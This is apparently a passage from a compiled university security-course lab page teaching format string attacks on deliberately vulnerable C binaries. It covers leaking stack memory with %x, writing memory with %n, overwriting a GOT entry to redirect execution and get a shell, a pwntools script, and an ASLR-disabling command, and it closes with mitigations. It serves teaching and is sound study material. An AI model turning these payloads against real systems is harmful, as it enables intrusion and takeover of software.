./basic_format_string\nAAAAAAAA\n%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx\nx7fffffffdcc07fffffffdcc0116022917ffff7dd18d06c6c25786c6c25786c6c25786c6c25786c6c25786c6c25787fffffffdcc07fffffffdcc01f6022917ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a\n\n$ ./basic_format_string\nAAAAAAAA\n%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx\n7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a4141414141414141\n")),(0,i.yg)("p",null,"In the last run we get the ",(0,i.yg)("inlineCode",{parentName:"p"},"4141414141414141")," representation of ",(0,i.yg)("inlineCode",{parentName:"p"},"AAAAAAAA"),".\nThat means that, if we replace the final ",(0,i.yg)("inlineCode",{parentName:"p"},"%lx")," with ",(0,i.yg)("inlineCode",{parentName:"p"},"%n"),", we will write at the address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x4141414141414141")," the number of characters processed so far:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ echo -n '7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a' | wc -c\n162\n")),(0,i.yg)("p",null,"We need that number to be ",(0,i.yg)("inlineCode",{parentName:"p"},"0x300"),".\nYou can fine tune the format string by using a construct such as ",(0,i.yg)("inlineCode",{parentName:"p"},"%32llx")," to print a number on ",(0,i.yg)("inlineCode",{parentName:"p"},"32")," characters instead of a maximum of ",(0,i.yg)("inlineCode",{parentName:"p"},"16")," characters.\nSee how much extra room you need and see if you reach ",(0,i.yg)("inlineCode",{parentName:"p"},"0x300")," bytes."),(0,i.yg)("p",null,"The construct needn't use a multiple of ",(0,i.yg)("inlineCode",{parentName:"p"},"8")," for length.\nYou may use the ",(0,i.yg)("inlineCode",{parentName:"p"},"%32llx")," or ",(0,i.yg)("inlineCode",{parentName:"p"},"%33llx")," or ",(0,i.yg)("inlineCode",{parentName:"p"},"%42llx"),".\nThe numeric argument states the length of the print output."),(0,i.yg)("p",null,"After the plan is complete, write down the attack by filling the ",(0,i.yg)("inlineCode",{parentName:"p"},"TODO")," lines in the ",(0,i.yg)("inlineCode",{parentName:"p"},"exploit.py")," solution skeleton."),(0,i.yg)("p",null,"When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint.\nThe precompiled binary can be found in ",(0,i.yg)("a",{parentName:"p",href:"/courses/cns/resources/repo",title:"cns:resources:repo"},"the CNS public repository"),"."),(0,i.yg)("p",null,"After you write 0x300 chars in v, you should obtain shell"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python exploit64.py\n[!] Could not find executable 'basic_format_string' in $PATH, using './basic_format_string' instead\n[+] Starting local process './basic_format_string': pid 20785\n[*] Switching to interactive mode\n                                     7fffffffdcc0  7fffffffdcc01f60229b7ffff7dd18d03125786c6c393425786c6c25786c6c34786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25a6e25\n$\n")),(0,i.yg)("h2",{id:"extra-format-string-attack"},"Extra: Format String Attack"),(0,i.yg)("p",null,"Go to the ",(0,i.yg)("inlineCode",{parentName:"p"},"04-format-string/")," subfolder.\nIn this task you will be working with a ",(0,i.yg)("strong",{parentName:"p"},"32-bit binary"),"."),(0,i.yg)("p",null,"The goal of this task is to call ",(0,i.yg)("inlineCode",{parentName:"p"},"my_evil_func")," again.\nThis task is also tutorial based."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-c"},'int main(int argc, char *argv[])\n{\n    printf(argv[1]);\n    printf("\\nThis is the most useless and insecure program!\\n");\n    return 0;\n}\n')),(0,i.yg)("h3",{id:"transform-format-string-attack-to-a-memory-write"},"Transform Format String Attack to a Memory Write"),(0,i.yg)("p",null,"Any string that represents a useful format (e.g. ",(0,i.yg)("inlineCode",{parentName:"p"},"%d"),", ",(0,i.yg)("inlineCode",{parentName:"p"},"%x")," etc.) can be used to discover the vulnerability."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ./format "%08x %08x %08x %08x"\n00000000 f759d4d3 00000002 ffd59bd4\nThis is the most useless and insecure program!\n')),(0,i.yg)("p",null,"The values starting with ",(0,i.yg)("inlineCode",{parentName:"p"},"0xf...")," are very likely pointers.\nAgain, we can use this vulnerability as a information leakage.\nBut we want more."),(0,i.yg)("p",null,"Another useful format for us is ",(0,i.yg)("inlineCode",{parentName:"p"},"%m$")," followed by any normal format selector.\nWhich means that the ",(0,i.yg)("inlineCode",{parentName:"p"},"m"),"th parameter is used as an input for the following format.\n",(0,i.yg)("inlineCode",{parentName:"p"},"%10$08x")," will print the ",(0,i.yg)("inlineCode",{parentName:"p"},"10"),"th parameter with ",(0,i.yg)("inlineCode",{parentName:"p"},"%08x"),".\nThis allows us to do a precise access of the stack."),(0,i.yg)("p",null,"Example:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ./format "%08x %08x %08x %08x %1\\$08x %2\\$08x %3\\$08x %4\\$08x"\n00000000 f760d4d3 00000002 ff9aca24 00000000 f760d4d3 00000002 ff9aca24\nThis is the most useless and insecure program!\n')),(0,i.yg)("p",null,"Note the equivalence between formats.\nNow, because we are able to select ",(0,i.yg)("em",{parentName:"p"},"any")," higher address with this function and because the buffer is on the stack, sooner or later we will discover our own buffer."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'./format "$(python -c \'print("%08x\\n" * 10000)\')"\n')),(0,i.yg)("p",null,'Depending on your setup you should be able to view the hex\nrepresentation of the string "%08x',"\\",'n".'),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Why do we need our own buffer?"),"\nRemember the ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," format?\nIt can be used to write at an address given as parameter.\nThe idea is to give this address as parameter and achieve memory writing.\nWe will see later how to control the value."),(0,i.yg)("p",null,"The next steps are done with ASLR disabled.\nIn order to disable ASLR, please run:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n")),(0,i.yg)("p",null,"By trial and error or by using GDB (breakpoint on ",(0,i.yg)("inlineCode",{parentName:"p"},"printf"),") we can determine where the buffer starts:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ./format "$(python -c \'import sys; sys.stdout.buffer.write(b"ABCD" + b"%08x\\n   " * 0x300)\')"  | grep -n 41 | head\n10:   ffffc410\n52:   ffffcc41\n72:   ffffcf41\n175:   44434241\n')),(0,i.yg)("p",null,"Command-line Python exploits tend to get very tedious and hard to read when the payload gets more complex.\nYou can use the following reference pwntools script to write your exploit.\nThe code is equivalent to the above one-liner."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python3\n\xa0\nfrom pwn import *\n\xa0\nstack_items = 200\n\xa0\npad = b"ABCD"\nval_fmt = b"%08x\\n   "\n# add a \\n at the end for consistency with the command-line run\nfmt = pad + val_fmt * stack_items + b"\\n"\n\xa0\nio = process(["./format", fmt])\n\xa0\nio.interactive()\n')),(0,i.yg)("p",null,"Then call the ",(0,i.yg)("inlineCode",{parentName:"p"},"format")," using:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"python exploit.py\n")),(0,i.yg)("p",null,'One idea is to keep things in multiple of 4, like "%08x ',"\\",'n".\nIf you are looking at line ',(0,i.yg)("inlineCode",{parentName:"p"},"175")," we have ",(0,i.yg)("inlineCode",{parentName:"p"},"44434241")," which is the base 16 representation of ",(0,i.yg)("inlineCode",{parentName:"p"},"ABCD")," (because it's little endian).\nNote, you can add as many format strings you want, the start of the buffer will be the same (more or less)."),(0,i.yg)("p",null,"We can compress our buffer by specifying the position of the argument."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ./format $(python -c \'import sys; sys.stdout.buffer.write(b"ABCD" + b"AAAAAAAA" * 199 + b"%175$08x")\')\nABCDAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAA44434241\nThis is the most useless and insecure program!\n')),(0,i.yg)("p",null,(0,i.yg)("inlineCode",{parentName:"p"},'b"AAAAAAAA" * 199')," is added to maintain the length of the original string, otherwise the offset might change."),(0,i.yg)("p",null,"You can see that the last information is our ",(0,i.yg)("inlineCode",{parentName:"p"},'b"ABCD"')," string printed with ",(0,i.yg)("inlineCode",{parentName:"p"},"%08x")," this means that we know where our buffer is."),(0,i.yg)("p",null,"You need to enable core dumps in order to reproduce the steps below:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"ulimit -c unlimited\n")),(0,i.yg)("p",null,"The steps below work an a given version of libc and a given system.\nIt's why the instruction that causes the fault is"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-asm"},"mov %edx,(%eax)\n")),(0,i.yg)("p",null,"or the equivalent in Intel syntax"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-asm"},"mov DWORD PTR [eax], edx\n")),(0,i.yg)("p",null,"It may be different on your system, for example ",(0,i.yg)("inlineCode",{parentName:"p"},"edx")," may be replaced by ",(0,i.yg)("inlineCode",{parentName:"p"},"esi"),", such as"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-asm"},"mov DWORD PTR [eax], esi\n")),(0,i.yg)("p",null,"Update the explanations below accordingly."),(0,i.yg)("p",null,"Remove any core files you may have generated before testing your program:"),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"rm -f core\n")),(0,i.yg)("p",null,"We can replace ",(0,i.yg)("inlineCode",{parentName:"p"},"%08x")," with ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," this should lead to segmentation fault."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ./format "$(python -c \'import sys; sys.stdout.buffer.write(b"ABCD" + b"AAAAAAAA" * 199 + b"%175$08n")\')"\nSegmentation fault (core dumped)\n\n$ gdb ./format -c core\n...\nCore was generated by `./format BCDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\'.\nProgram terminated with signal 11, Segmentation fault.\n#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6\n(gdb) bt\n#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6\n#1  0xf7e5deff in printf () from /lib/i386-linux-gnu/libc.so.6\n#2  0x08048468 in main (argc=2, argv=0xffffd2f4) at format.c:18\n(gdb) x/i $eip\n=> 0xf7e580a2 <vfprintf+17906>:    mov    %edx,(%eax)\n(gdb) info registers $edx $eax\nedx            0x202    1596\neax            0x44434241   1145258561\n(gdb) quit\n')),(0,i.yg)("p",null,"Bingo.\nWe have memory write.\nThe vulnerable code tried to write at the address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x44434241")," (",(0,i.yg)("inlineCode",{parentName:"p"},'"ABCD"')," little endian) the value 1596.\nThe value 1596 is the amount of data wrote so far by ",(0,i.yg)("inlineCode",{parentName:"p"},'printf("ABCD" + 199 * "AAAAAAAA")'),"."),(0,i.yg)("p",null,"Right now, our input string has 1605 bytes (1604 with a ",(0,i.yg)("inlineCode",{parentName:"p"},"n")," at the end).\nBut we can further compress it, thus making the value that we write independent of the length of the input."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},'$ ./format "$(python -c \'import sys; sys.stdout.buffer.write("ABCD" + "A" * 1588 + "%99x" + "%126$08n")\')"\nSegmentation fault (core dumped)\n\n$ gdb ./format -c core\n(gdb) info registers $edx $eax\nedx            0x261    1691\neax            0x44434241   1145258561\n(gdb) quit\n')),(0,i.yg)("p",null,"Here we managed to write ",(0,i.yg)("inlineCode",{parentName:"p"},"1691")," (",(0,i.yg)("inlineCode",{parentName:"p"},"4+1588+99"),").\nNote we should keep the number of bytes before the format string the same.\nWhich means that if we want to print with a padding of 100 (three digits) we should remove one ",(0,i.yg)("inlineCode",{parentName:"p"},"A"),".\nYou can try this by yourself."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"How far can we go?"),"\nProbably we can use any integer for specifying the number of bytes which are used for a format, but we don't need this;\nmoreover specifying a very large padding is not always feasible, think what happens when printing with ",(0,i.yg)("inlineCode",{parentName:"p"},"snprintf"),".\n",(0,i.yg)("inlineCode",{parentName:"p"},"255")," should be enough."),(0,i.yg)("p",null,"Remember, we want to write a value to a certain address.\nSo far we control the address, but the value is somewhat limited.\nIf we want to write 4 bytes at a time we can make use of the endianness of the machine.\n",(0,i.yg)("strong",{parentName:"p"},"The idea")," is to write at the address n and then at the address n+1 and so on."),(0,i.yg)("p",null,"Lets first display the address.\nWe are using the address ",(0,i.yg)("inlineCode",{parentName:"p"},"0x804c014"),".\nThis address is the address of the got entry for the puts function.\nBasically, we will override the got entry for the puts."),(0,i.yg)("p",null,"Check the ",(0,i.yg)("inlineCode",{parentName:"p"},"exploit.py")," script from the task directory, read the commends and understand what it does."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ python exploit.py\n[*] 'format'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './format': pid 29030\n[*] Switching to interactive mode\n[*] Process './format' stopped with exit code 0 (pid 29030)\n\\x14\\x04\\x15\\x04\\x17\\x04\\x18\\x04 804c014  804c015  804c017  804c018 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...\nThis is the most useless and insecure program!\n")),(0,i.yg)("p",null,"The output starts with ",(0,i.yg)("inlineCode",{parentName:"p"},"\\x14\\x04\\x15\\x04\\x17\\x04\\x18\\x04 804c014  804c015  804c017  804c018")," which is the 4 addresses we have written (raw, little endian) followed by the numerical prints done with ",(0,i.yg)("inlineCode",{parentName:"p"},"%x")," of the same addresses."),(0,i.yg)("p",null,"If you have the same output it means that now, if you replace ",(0,i.yg)("inlineCode",{parentName:"p"},"%x")," with ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," (change ",(0,i.yg)("inlineCode",{parentName:"p"},"fmt = write_fmt")," in the script) it will try to write something at those valid addresses."),(0,i.yg)("p",null,"We want to put the value ",(0,i.yg)("inlineCode",{parentName:"p"},"0x080491a6"),"."),(0,i.yg)("pre",null,(0,i.yg)("code",{parentName:"pre",className:"language-console"},"$ objdump -d ./format | grep my_evil\n080491a6 <my_evil_func>:\n")),(0,i.yg)("p",null,"As ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," writes how many characters have been printed until it is reached, each ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," will print an incrementally larger value.\nWe use the 4 adjacent addresses to write byte by byte and use overflows to reach a lower value for the next byte.\nFor example, after writing ",(0,i.yg)("inlineCode",{parentName:"p"},"0xa6")," we can write ",(0,i.yg)("inlineCode",{parentName:"p"},"0x0191"),":"),(0,i.yg)("p",null,(0,i.yg)("img",{parentName:"p",src:"https://ocw.cs.pub.ro/courses/_media/cns/labs/bytes_write.png",alt:"Write Bytes"})),(0,i.yg)("p",null,"Also, the ",(0,i.yg)("inlineCode",{parentName:"p"},"%n")," count doesn't reset so, if we want to write ",(0,i.yg)("inlineCode",{parentName:"p"},"0xa6")," and then ",(0,i.yg)("inlineCode",{parentName:"p"},"0x91")," the payload should be in the form of ",(0,i.yg)("inlineCode",{parentName:"p"},"<0xa6 bytes>%n<0x100 - 0xa6 + 0x91 bytes>%n"),"."),(0,i.yg)("p",null,"As mentioned earlier above, instead writing N bytes ",(0,i.yg)("inlineCode",{parentName:"p"},"\u201cA\u201d * N")," you can use other format strings like ",(0,i.yg)("inlineCode",{parentName:"p"},"%Nc")," or ",(0,i.yg)("inlineCode",{parentName:"p"},"%Nx")," to keep the payload shorter."),(0,i.yg)("p",null,(0,i.yg)("strong",{parentName:"p"},"Bonus task"),": Can you get a shell?\n(Assume ",(0,i.yg)("inlineCode",{parentName:"p"},"ASLR")," is disabled)."),(0,i.yg)("h3",{id:"mitigation-and-recommendations"},"Mitigation and Recommendations"),(0,i.yg)("ol",null,(0,i.yg)("li",{parentName:"ol"},"Manage the string length carefully."),(0,i.yg)("li",{parentName:"ol"},"Don't use ",(0,i.yg)("inlineCode",{parentName:"li"},"gets"),".\nWith ",(0,i.yg)("inlineCode",{parentName:"li"},"gets")," there is no way of knowing how much data was read"),(0,i.yg)("li",{parentName:"ol"},"Use string functions with ",(0,i.yg)("inlineCode",{parentName:"li"},"n")," parameter, whenever a non constant string is involved, i.e. ",(0,i.yg)("inlineCode",{parentName:"li"},"strnprintf"),", ",(0,i.yg)("inlineCode",{parentName:"li"},"strncat"),"."),(0,i.yg)("li",{parentName:"ol"},"Make sure that the ",(0,i.yg)("inlineCode",{parentName:"li"},"NUL")," byte is added, for instance ",(0,i.yg)("inlineCode",{parentName:"li"},"strncpy")," does ",(0,i.yg)("strong",{parentName:"li"},"not")," add a ",(0,i.yg)("inlineCode",{parentName:"li"},"NUL")," byte."),(0,i.yg)("li",{parentName:"ol"},"Use ",(0,i.yg)("inlineCode",{parentName:"li"},"wcstr*")," functions when dealing with wide char strings."),(0,i.yg)("li",{parentName:"ol"},"Don't trust the user!")),(0,i.yg)("h3",{id:"real-life-examples"},"Real life Examples"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},(0,i.yg)("a",{parentName:"p",href:"http://xkcd.com/1354/"},(0,i.yg)("inlineCode",{parentName:"a"},"Heartbleed")),"\nLinux kernel through 3.9.4 ",(0,i.yg)("a",{parentName:"p",href:"http://www.cvedetails.com/cve/CVE-2013-2851/"},"CVE-2013-2851"),"\nThe fix is ",(0,i.yg)("a",{parentName:"p",href:"https://lore.kernel.org/all/1370649055-12830-2-git-send-email-keescook@chromium.org/"},"here"),".\nMore details ",(0,i.yg)("a",{parentName:"p",href:"http://www.intelligentexploit.com/view-details-ascii.html?id=16609"},"here"),".")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},"Windows 7 ",(0,i.yg)("a",{parentName:"p",href:"http://www.cvedetails.com/cve/CVE-2012-1851/"},"CVE-2012-1851"))),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("p",{parentName:"li"},"Pidgin off the record plugin ",(0,i.yg)("a",{parentName:"p",href:"http://www.cvedetails.com/cve/CVE-2012-2369"},"CVE-2012-2369"),".\nThe fix is ",(0,i.yg)("a",{parentName:"p",href:"https://bugzilla.novell.com/show_bug.cgi?id=762498#c1"},"here")))),(0,i.yg)("h2",{id:"resources"},"Resources"),(0,i.yg)("ul",null,(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://www.cert.org/books/secure-coding/"},"Secure Coding in C and C++")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://www.informit.com/articles/article.aspx?p=2036582"},"String representation in  C")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"https://www.owasp.org/index.php/Improper_string_length_checking"},"Improper string length checking")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://cwe.mitre.org/data/definitions/134.html"},"Format String definition")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"https://www.owasp.org/index.php/Format_string_attack"},"Format String Attack (",(0,i.yg)("inlineCode",{parentName:"a"},"OWASP"),")")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://projects.webappsec.org/w/page/13246926/Format%20String"},"Format String Attack (",(0,i.yg)("inlineCode",{parentName:"a"},"webappsec"),")")),(0,i.yg)("li",{parentName:"ul"},(0,i.yg)("a",{parentName:"li",href:"http://www.gratisoft.us/todd/papers/strlcpy.html"},(0,i.yg)("inlineCode",{parentName:"a"},"strlcpy")," and ",(0,i.yg)("inlineCode",{parentName:"a"},"strlcat")," - consistent, safe, string copy and  concatenation."),": This resource is useful to understand some of the string manipulation problems.")))}d.isMDXComponent=!0}}]);